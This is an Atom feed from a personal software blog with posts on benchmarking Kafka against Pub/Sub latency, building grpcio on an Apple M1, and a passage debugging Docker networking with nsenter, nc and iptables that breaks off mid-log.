<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Programming & Software | David Xia]]></title>
  <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
  <link href="https://www.davidxia.com/"/>
  <updated>2021-08-18T10:02:29-04:00</updated>
  <id>https://www.davidxia.com/</id>
  <author>
    <name><![CDATA[David Xia]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Benchmarking Kafka and Google Cloud Pub/Sub Latencies]]></title>
    <link href="https://www.davidxia.com/2021/08/benchmarking-kafka-and-google-cloud-pub-slash-sub-latencies/"/>
    <updated>2021-08-18T09:22:47-04:00</updated>
    <id>https://www.davidxia.com/2021/08/benchmarking-kafka-and-google-cloud-pub-slash-sub-latencies</id>
    <content type="html"><![CDATA[<p>I&rsquo;m helping a recently acquired team at work figure out if they can migrate from Kafka to Google
Cloud Pub/Sub. Part of the exploration was figuring out the change in latencies, if any, from
switching.</p>

<p>The team&rsquo;s production setup is like this.</p>

<ul>
<li>They paid an external company called Confluent to run a managed Kafka cluster in AWS
Oregon.</li>
<li>This is the same region where this team ran all their backend services. Part of their
migration also involves switching their workloads from AWS Oregon to GCP us-central1. If they choose
to migrate to Pub/Sub, their services will be publishing and subscribing to messages across cloud
providers and regions. So my latency benchmarks took that into account.</li>
<li>All their services are written in Golang.</li>
<li>Services run as containers in AWS Elastic Container Service.</li>
</ul>


<p>I defined latency as the time elapsed from when a message is published and when it&rsquo;s received by a
subscriber. I didn&rsquo;t count the extra time it takes for a subscriber to acknowledge the message. I
used Golang and the same upstream libraries for Kafka and Pub/Sub that they used or would use,
respectively, in production. I published messages of various sizes at various rates from AWS EC2
instances in Oregon for five minutes. At the same time, five Google Compute Engine instances in
us-central1 subscribed to these messages (pull-based) as fast as possible with an initial burn-in
period of one minute. I didn&rsquo;t measure the latency until the burn-in period elapsed to avoid any
effects on latency that may arise from using a new topic or subscription or not enough messages
flowing through the messaging service. This ensured I more closely mimicked message latency in
production. I always took the percentile summary of the subscriber with the second highest p99
latency. I created new Pub/Sub or Kafka topics for each series in the graphs below. Kafka topics
always had eight partitions.</p>

<p>I took some inspiration from a blog post titled &ldquo;<a href="https://bravenewgeek.com/benchmarking-message-queue-latency/">Benchmarking Message Queue
Latency</a>&rdquo; and also found the following GCP post &ldquo;<a href="https://cloud.google.com/blog/products/data-analytics/testing-cloud-pubsub-clients-to-maximize-streaming-performance">Testing Cloud Pub/Sub clients to
maximize streaming performance</a>.&rdquo; The latter linked to the <a href="https://github.com/GoogleCloudPlatform/pubsub/tree/master/load-test-framework">code used to benchmark
Pub/Sub</a>. Unfortunately, after trying that tool many times and finding it
wasn&rsquo;t documented well or had various issues <a href="https://github.com/GoogleCloudPlatform/pubsub/issues/293">like this</a>, I gave up
and wrote my own simple latency benchmarker in Golang. This was probably better anyways to ensure I
was using the same language and client libraries as the team I was helping.</p>

<p>My full results are in <a href="https://docs.google.com/spreadsheets/d/1x_J05pX5IcuUxwpB74d2wC3vk6zD34KYP4uYP6pEeYg/edit?usp=sharing">this Google sheet</a>. The benchmarking code is at
<a href="https://github.com/davidxia/cloud-message-latency">github.com/davidxia/cloud-message-latency</a>.</p>

<!-- more -->


<h3>Pub/Sub Latencies</h3>

<iframe width="739" height="355" seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vRvF9RCLQRzc3QlLCTwaDNppVn-C0P_nAXMdZMhTVAaTJTITFyWe28bG8iqIlyARzY38R_ULFluNMRZ/pubchart?oid=305705269&amp;format=interactive"></iframe>




<iframe width="739" height="355" seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vRvF9RCLQRzc3QlLCTwaDNppVn-C0P_nAXMdZMhTVAaTJTITFyWe28bG8iqIlyARzY38R_ULFluNMRZ/pubchart?oid=312410551&amp;format=interactive"></iframe>




<iframe width="739" height="355" seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vRvF9RCLQRzc3QlLCTwaDNppVn-C0P_nAXMdZMhTVAaTJTITFyWe28bG8iqIlyARzY38R_ULFluNMRZ/pubchart?oid=1176822520&amp;format=interactive"></iframe>


<h3>Kafka Latencies</h3>

<iframe width="739" height="355" seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vRvF9RCLQRzc3QlLCTwaDNppVn-C0P_nAXMdZMhTVAaTJTITFyWe28bG8iqIlyARzY38R_ULFluNMRZ/pubchart?oid=1339085412&amp;format=interactive"></iframe>




<iframe width="739" height="355" seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vRvF9RCLQRzc3QlLCTwaDNppVn-C0P_nAXMdZMhTVAaTJTITFyWe28bG8iqIlyARzY38R_ULFluNMRZ/pubchart?oid=1020717340&amp;format=interactive"></iframe>




<iframe width="739" height="355" seamless frameborder="0" scrolling="no" src="https://docs.google.com/spreadsheets/d/e/2PACX-1vRvF9RCLQRzc3QlLCTwaDNppVn-C0P_nAXMdZMhTVAaTJTITFyWe28bG8iqIlyARzY38R_ULFluNMRZ/pubchart?oid=1350314893&amp;format=interactive"></iframe>


<h2>Summary</h2>

<p>With my specific test parameters, Kafka p99 latencies are 100-200ms and much lower than Pub/Sub
latencies. In the worst case scenarios, Pub/Sub latencies were almost an order of magnitude higher.
Pub/Sub p99 latencies were approximately 0.5-1 seconds at the team&rsquo;s current publisher throughput
which is relatively low at about 1KB/s. At higher throughputs the latencies dropped to 300-400ms.
This conforms to Google&rsquo;s documentation and generally accepted knowledge that Pub/Sub performs
faster at higher message volumes. According to one of that team&rsquo;s engineers, this latency is
acceptable for all messages except for one which can be changed to a direct service-to-service
request.</p>

<p>It was also interesting to see that message delivery was pretty evenly spread out over five
subscribers with Pub/Sub. Kafka often had a few consumers that received twice as many messages as
their peers.</p>

<p>After I finished benchmarking, I found <a href="https://github.com/GoogleCloudPlatform/PerfKitBenchmarker">PerfKitBenchmarker</a>, an open source benchmarking tool used
to measure and compare cloud offerings. It looks promising, but I haven&rsquo;t tried it out yet.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Install Grpcio Pip Package on Apple M1]]></title>
    <link href="https://www.davidxia.com/2021/05/how-to-install-grpcio-pip-package-on-apple-m1/"/>
    <updated>2021-05-08T22:42:53-07:00</updated>
    <id>https://www.davidxia.com/2021/05/how-to-install-grpcio-pip-package-on-apple-m1</id>
    <content type="html"><![CDATA[<p>I spent a long time figuring out how to install the latest <a href="https://pypi.org/project/grpcio/">grpcio</a> Pip package (version 1.37.1) on
my Apple M1 Macbook.</p>

<pre><code>pip install grpcio

Looking in indexes: https://pypi.org/simple, https://artifactory.spotify.net/artifactory/api/pypi/pypi/simple
Collecting grpcio
  Downloading https://artifactory.spotify.net/artifactory/api/pypi/pypi/packages/packages/a0/d6/d04c6550debe23e2eaef0d9c4adccbb6e20d8cce6da40ae989fe8836e287/grpcio-1.37.1.tar.gz (21.7 MB)
     |████████████████████████████████| 21.7 MB 143 kB/s
Requirement already satisfied: six&gt;=1.5.2 in ./.virtualenvs/spotify/lib/python3.9/site-packages (from grpcio) (1.12.0)
Building wheels for collected packages: grpcio
  Building wheel for grpcio (setup.py) ... error
  ERROR: Command errored out with exit status 1:
...

  third_party/zlib/gzlib.c:252:9: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
          LSEEK(state-&gt;fd, 0, SEEK_END);  /* so gzoffset() is correct */
          ^
  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
  #  define LSEEK lseek
                  ^
  third_party/zlib/gzlib.c:252:9: note: did you mean 'fseek'?
  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
  #  define LSEEK lseek
                  ^
  /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/stdio.h:162:6: note: 'fseek' declared here
  int      fseek(FILE *, long, int);
           ^
  third_party/zlib/gzlib.c:258:24: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
          state-&gt;start = LSEEK(state-&gt;fd, 0, SEEK_CUR);
                         ^
  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
  #  define LSEEK lseek
                  ^
  third_party/zlib/gzlib.c:359:9: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
      if (LSEEK(state-&gt;fd, state-&gt;start, SEEK_SET) == -1)
          ^
  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
  #  define LSEEK lseek
                  ^
  third_party/zlib/gzlib.c:400:15: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
          ret = LSEEK(state-&gt;fd, offset - state-&gt;x.have, SEEK_CUR);
                ^
  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
  #  define LSEEK lseek
                  ^
  third_party/zlib/gzlib.c:496:14: error: implicit declaration of function 'lseek' is invalid in C99 [-Werror,-Wimplicit-function-declaration]
      offset = LSEEK(state-&gt;fd, 0, SEEK_CUR);
               ^
  third_party/zlib/gzlib.c:14:17: note: expanded from macro 'LSEEK'
  #  define LSEEK lseek
                  ^
  5 errors generated.

...

  clang -Wno-unused-result -Wsign-compare -Wunreachable-code -DNDEBUG -g -fwrapv -O3 -Wall -I/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include -I/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include -I/Users/dxia/.virtualenvs/spotify/include -I/Users/dxia/.pyenv/versions/3.9.1/include/python3.9 -c /var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/tmpyvic7ha6/a.c -o None/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/tmpyvic7ha6/a.o
  Traceback (most recent call last):
    File "/Users/dxia/.pyenv/versions/3.9.1/lib/python3.9/distutils/unixccompiler.py", line 117, in _compile
      self.spawn(compiler_so + cc_args + [src, '-o', obj] +
    File "/private/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/pip-install-1ha5py6y/grpcio_12658497b5464faa852de046ce91485a/src/python/grpcio/_spawn_patch.py", line 54, in _commandfile_spawn
      _classic_spawn(self, command)
    File "/Users/dxia/.pyenv/versions/3.9.1/lib/python3.9/distutils/ccompiler.py", line 910, in spawn
      spawn(cmd, dry_run=self.dry_run)
    File "/Users/dxia/.pyenv/versions/3.9.1/lib/python3.9/distutils/spawn.py", line 87, in spawn
      raise DistutilsExecError(
  distutils.errors.DistutilsExecError: command '/usr/bin/clang' failed with exit code 1

...

    ----------------------------------------
ERROR: Command errored out with exit status 1: /Users/dxia/.virtualenvs/spotify/bin/python -u -c 'import io, os, sys, setuptools, tokenize; sys.argv[0] = '"'"'/private/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/pip-install-1ha5py6y/grpcio_12658497b5464faa852de046ce91485a/setup.py'"'"'; __file__='"'"'/private/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/pip-install-1ha5py6y/grpcio_12658497b5464faa852de046ce91485a/setup.py'"'"';f = getattr(tokenize, '"'"'open'"'"', open)(__file__) if os.path.exists(__file__) else io.StringIO('"'"'from setuptools import setup; setup()'"'"');code = f.read().replace('"'"'\r\n'"'"', '"'"'\n'"'"');f.close();exec(compile(code, __file__, '"'"'exec'"'"'))' install --record /private/var/folders/x1/f9sjnv7j43z73sdv5lsk3r8h0000gp/T/pip-record-n4ihfdh1/install-record.txt --single-version-externally-managed --compile --install-headers /Users/dxia/.virtualenvs/spotify/include/site/python3.9/grpcio Check the logs for full command output.
</code></pre>

<p>Fixed by setting the following (I use <a href="https://fishshell.com">fish shell</a>). I found the first four environment variables in
this <a href="https://github.com/grpc/grpc/issues/24677#issuecomment-729983060">Github comment</a>. The second two I knew to add because I was seeing errors about the compiler
not being able to find the openssl.h and re.h header files.</p>

<pre><code>set -x GRPC_BUILD_WITH_BORING_SSL_ASM ""
set -x GRPC_PYTHON_BUILD_SYSTEM_RE2 true
set -x GRPC_PYTHON_BUILD_SYSTEM_OPENSSL true
set -x GRPC_PYTHON_BUILD_SYSTEM_ZLIB true
set -x CPPFLAGS "-I"(brew --prefix openssl)"/include -I"(brew --prefix re2)"/include"
set -x LDFLAGS "-L"(brew --prefix openssl)"/lib -L"(brew --prefix re2)"/lib"
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What I Recently Learned About Docker Networking and Debugging Networking Issues in General]]></title>
    <link href="https://www.davidxia.com/2021/05/what-i-recently-learned-about-docker-networking-and-debugging-network-issues-in-general/"/>
    <updated>2021-05-02T16:39:02-07:00</updated>
    <id>https://www.davidxia.com/2021/05/what-i-recently-learned-about-docker-networking-and-debugging-network-issues-in-general</id>
    <content type="html"><![CDATA[<p>This is a story about how debugged a confounding local development environment issue, what I
learned about Docker in the process, and the generally applicable debugging strategies and
techniques that helped me ultimately solve it. Skip to the end if you only want to read the
debugging strategies and techniques. The overall story, however, will illustrate how they applied
in this specific case.</p>

<h2>Problem Statement and Use Case</h2>

<p>A data infrastructure team at work provides a tool for starting a data pipeline job from a local
development environment. Let&rsquo;s call this tool <code>foo</code>. This tool depends on <code>gcloud</code> and <code>docker</code>.
It creates a user-defined Docker network, runs a utility container called <code>bar</code> connected to that
network, and then runs another container called qux that talks to bar to retrieve Oauth tokens
from Google Cloud Platform (GCP).</p>

<p>Most developers run <code>foo</code> on their local workstations, e.g. Macbooks. But I have the newer
Macbook with the Apple M1 ARM-based chip. <a href="https://docs.docker.com/docker-for-mac/install/">Docker Desktop on Mac</a> support for M1s was
relatively recent. I didn&rsquo;t want deal with Docker weirdness. I also didn&rsquo;t have a lot of free
disk space on my 256GB Macbook and thus didn&rsquo;t feel like clogging up my drive with lots of Java,
Scala, and Docker gunk.</p>

<p>So I tried running <code>foo</code> on a GCE VM configured by our <a href="https://puppet.com/">Puppet</a> configuration files. I ran <code>foo</code>,
I got this error.</p>

<!-- more -->


<h2>Error #1: inter-container networking failed between containers attached to user-defined Docker networks</h2>

<pre><code>dxia@my-host$ foo --verbose run -f data-info.yaml -w DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name
DEBUG:verify: Docker network `foo-network` already exists
DEBUG:verify: bar container found.
INFO:run: starting workflow DumpKubernetesContainerImagesJob ...
ERROR: (gcloud.auth.activate-service-account) [Errno 110] Connection timed out
This may be due to network connectivity issues. Please check your network settings, and the status of the service you are trying to reach.
Traceback (most recent call last):
  File "/usr/local/bin/activate-google-application-credentials", line 19, in &lt;module&gt;
    'auth', 'activate-service-account', '--key-file', json_path])
  File "/usr/lib/python3.6/subprocess.py", line 311, in check_call
    raise CalledProcessError(retcode, cmd)
subprocess.CalledProcessError: Command '['gcloud', 'auth', 'activate-service-account', '--key-file', '/etc/_foo/gcp-sa-key.json']' returned non-zero exit status 1.
ERROR:foo:

  RAN: /usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-26 -e FOO_DOCKER_IMAGE=my-project:20210426T211411-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26' -e FOO_EXECUTION_ID=foorun-2e30c385-2f89-494c-bc0e-97b3eff316d5 -e FOO_TRIGGER_ID=foo-942f155b-49eb-4af8-a6e4-3adf6f72577b -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210426T211411-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26

  STDOUT:


  STDERR:
Traceback (most recent call last):
  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/foo.py", line 304, in main
    args.func(args)
  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/foo.py", line 269, in _run
    args.declarative_infra,
  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/run.py", line 641, in run_workflow
    declarative_infra,
  File "/home/dxia/my-project//lib/python3.6/site-packages/foo/run.py", line 161, in _run_workflow
    p.wait()
  File "/home/dxia/my-project//lib/python3.6/site-packages/sh.py", line 841, in wait
    self.handle_command_exit_code(exit_code)
  File "/home/dxia/my-project//lib/python3.6/site-packages/sh.py", line 865, in handle_command_exit_code
    raise exc
sh.ErrorReturnCode_1:

  RAN: /usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-26 -e FOO_DOCKER_IMAGE=my-project:20210426T211411-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26' -e FOO_EXECUTION_ID=foorun-2e30c385-2f89-494c-bc0e-97b3eff316d5 -e FOO_TRIGGER_ID=foo-942f155b-49eb-4af8-a6e4-3adf6f72577b -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210426T211411-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-26

  STDOUT:


  STDERR:
</code></pre>

<p>The HTTP connection timed out. First I checked whether the container started by <code>foo</code> can make a TCP
connection to the bar container. I ran <code>foo --verbose run -f data-info.yaml -w
DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name</code>
again and did the following in another terminal window.</p>

<p><a href="https://man7.org/linux/man-pages/man1/nsenter.1.html"><code>nsenter</code></a> is a cool tool that allows you to run programs in different Linux namespaces.
It&rsquo;s very useful when you can&rsquo;t get an executable shell into a container with commands like
<code>docker exec -it ... bash</code>. This can happen when the container doesn&rsquo;t even include any shells
and just has the binary executable for instance.</p>

<pre><code>dxia@my-host:~$ docker ps
CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
a0e872188831        my-project:20210426T211411-2b5452d         "/usr/local/bin/edge…"   2 seconds ago       Up 1 second                                   relaxed_pike
4dda670a2ee1        foo/bar:latest                                   "./bar"               2 hours ago         Up 2 hours          0.0.0.0:80-&gt;80/tcp        bar

dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  a0e872188831)  nc 172.20.0.127 80 -nvz -w 5
(UNKNOWN) [172.20.0.127] 80 (http) : Connection timed out
</code></pre>

<p>So the HTTP connection timeout was caused by an error lower down on the networking stack: an
inability to establish a TCP connection. A TCP connection from the host to bar worked though.</p>

<pre><code>dxia@my-host:~$ nc 172.20.0.127 80 -nvz -w 5
(UNKNOWN) [172.20.0.127] 80 (http) open
</code></pre>

<p>When I see a networking issue like this, I know there might be some misconfigured firewall rule
blocking IP packets. I listed all the firewall rules. The ones in the filter table&rsquo;s <code>FORWARD</code>
chain caught my attention.</p>

<pre><code>dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
Chain FORWARD (policy DROP 38 packets, 2280 bytes)
num   pkts bytes target     prot opt in     out     source               destination
1     6204  492K DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
2     6204  492K DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
3     3080  323K ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
4        1    60 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
5     3085  167K ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
7      264 17722 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
8     7382   17M ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
</code></pre>

<p>I disabled the GCE VM&rsquo;s cronned Puppet run and then ran <code>sudo systemctl restart docker</code>. I ran
bar and a test nginx1 container connected to <code>foo-network</code>.</p>

<pre><code>dxia@my-host:~$ docker run --rm -d -v ~/.config/gcloud/:/.config/gcloud --name bar --net foo-network --ip 172.20.0.127 -p 80:80 foo/bar:latest
3f9cc17b3f71e7056fd8072449afa78eb9a6a166ac091d751b69545ead0438b1

dxia@my-host:~$ docker run --net foo-network --name nginx1 -d -p 8080:80 nginx:latest
1b0b2b981f9389a989aa8f60a141b5e9a18ba5582141b6668c9078b6312dcfaf

dxia@my-host:~$ docker ps
CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED              STATUS              PORTS                     NAMES
1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   5 seconds ago        Up 3 seconds        0.0.0.0:8080-&gt;80/tcp      nginx1
3f9cc17b3f71        foo/bar:latest                                   "./bar"               About a minute ago   Up 59 seconds       0.0.0.0:80-&gt;80/tcp        bar
</code></pre>

<p>Now a TCP connection from the nginx container to bar succeeded.</p>

<pre><code>dxia@my-host:~$ sudo nsenter --net=$(docker inspect --format  nginx1) nc 172.20.0.127 80 -nvz -w 5
(UNKNOWN) [172.20.0.127] 80 (http) open
</code></pre>

<p>I checked iptables rules again and saw two additional rules (7 and 8) in the filter table&rsquo;s
<code>FORWARD</code> chain. Rule 8 allowed IP packets coming in from the <code>br-8ce7e363e4f9</code> network interface
(in this case a <a href="https://developers.redhat.com/blog/2018/10/22/introduction-to-linux-interfaces-for-virtual-networking/#bridge">Linux bridge</a>) and leaving through the same interface.</p>

<pre><code>dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
Chain FORWARD (policy DROP 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination
1        0     0 DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
2        0     0 DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
3        0     0 ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
4        0     0 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
5        0     0 ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
7        0     0 ACCEPT     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
8        0     0 ACCEPT     all  --  br-8ce7e363e4f9 br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
9      264 17722 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
10    7382   17M ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
</code></pre>

<p>When I re-ran Puppet rules 7 and 8 were deleted and containers on the <code>foo-network</code> were again
unable to establish a TCP connection. I added rule 8 manually and confirmed this is the rule
causing my error above.</p>

<pre><code>dxia@my-host:~$ sudo iptables --table filter --append FORWARD --in-interface br-8ce7e363e4f9 --out-interface br-8ce7e363e4f9 --source 0.0.0.0/0 --destination 0.0.0.0/0 --jump ACCEPT

dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
Chain FORWARD (policy DROP 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination
1    23526 1377K DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
2    23526 1377K DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
3    11728  755K ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
4        1    60 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
5    11737  617K ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
7      182 12970 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
8       39  2748 ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
9        0     0 ACCEPT     all  --  br-8ce7e363e4f9 br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0

dxia@my-host:~$ sudo nsenter --net=$(docker inspect --format  nginx1) nc 172.20.0.127 80 -nvz -w 5
(UNKNOWN) [172.20.0.127] 80 (http) open
</code></pre>

<p>Now running <code>foo</code> gave a different error.</p>

<h2>Error #2: DNS queries for external records from bar failed</h2>

<pre><code>dxia@my-host$ foo run -f data-info.yaml -w DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name
INFO:run: starting workflow DumpKubernetesContainerImagesJob ...
ERROR: (gcloud.auth.activate-service-account) There was a problem refreshing your current auth tokens: Invalid response 500.
Please run:

  $ gcloud auth login

to obtain new credentials.

If you have already logged in with a different account:

    $ gcloud config set account ACCOUNT

to select an already authenticated account to use.
Traceback (most recent call last):
  File "/usr/local/bin/activate-google-application-credentials", line 19, in &lt;module&gt;
    'auth', 'activate-service-account', '--key-file', json_path])
  File "/usr/lib/python3.6/subprocess.py", line 311, in check_call
    raise CalledProcessError(retcode, cmd)
subprocess.CalledProcessError: Command '['gcloud', 'auth', 'activate-service-account', '--key-file', '/etc/_foo/gcp-sa-key.json']' returned non-zero exit status 1.
ERROR:foo: non-zero exit code (1) from `/usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-02 